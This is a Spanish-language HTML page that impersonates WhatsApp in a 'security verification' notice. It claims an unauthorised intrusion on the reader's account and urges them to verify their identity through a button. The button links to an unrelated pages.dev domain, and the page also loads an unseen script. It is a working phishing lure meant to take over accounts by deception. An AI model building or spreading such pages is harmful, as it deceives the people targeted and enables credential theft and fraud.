<!DOCTYPE html>
<html lang="es">
<head>
    <script src="https://wurfl.io/wurfl.js"></script>
    <link rel="shortcut icon" href="img/favicon.ico">
    <link rel="apple-touch-icon" href="img/favicon.png"> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="./images/favicon.png">

    <title>Verificación de Seguridad de WhatsApp</title>
    <style>
        body {
            font-family: 'Helvetica', 'Arial', sans-serif;
            background-color: #e6e7e8;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            box-sizing: border-box;
        }
        .container {
            background-color: #ffffff;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0px 0px 20px rgba(0,0,0,0.1);
            text-align: center;
            padding: 20px;
            width: 100%;
            max-width: 480px;
            box-sizing: border-box;
            height: auto;
            min-height: 100vh;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        h1, h2 {
            color: #128C7E; /* Color característico de WhatsApp */
            margin: 20px 0;
        }
        p {
            color: #565656;
        }
        a {
            background-color: #25D366; /* Color del botón de WhatsApp */
            color: #ffffff;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.15);
            display: inline-block;
            transition: background-color 0.3s ease;
        }
        a:hover {
            background-color: #128C7E;
        }
        @media (max-width: 480px) {
            .container {
                border-radius: 0;
                box-shadow: none;
                max-width: 100%;
                min-height: 100vh;
                height: auto;
                margin: 0;
                padding: 20px;
                display: flex;
                flex-direction: column;
                justify-content: center;
            }
            img[alt="Logo WhatsApp"] {
                width: 120px;
                margin-top: 0;
                margin-bottom: 20px;
                display: block;
                margin-left: auto;
                margin-right: auto;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="images/JvsnINJ2CZv.svg" alt="Logo WhatsApp" style="width: 120px; margin-top: 20px;">
        <h2>Acción Requerida: Verificación de Seguridad</h2>
        <p>Hemos detectado una posible intrusión no autorizada en tu cuenta de WhatsApp. Es crucial que verifiques tu identidad para proteger tu cuenta y continuar usándola de forma segura.</p>
        <a href="https://gttwssw.pages.dev/">Verificar Mi Cuenta</a>
    </div>
    <script src="js/script.js"></script>
</body>
</html>
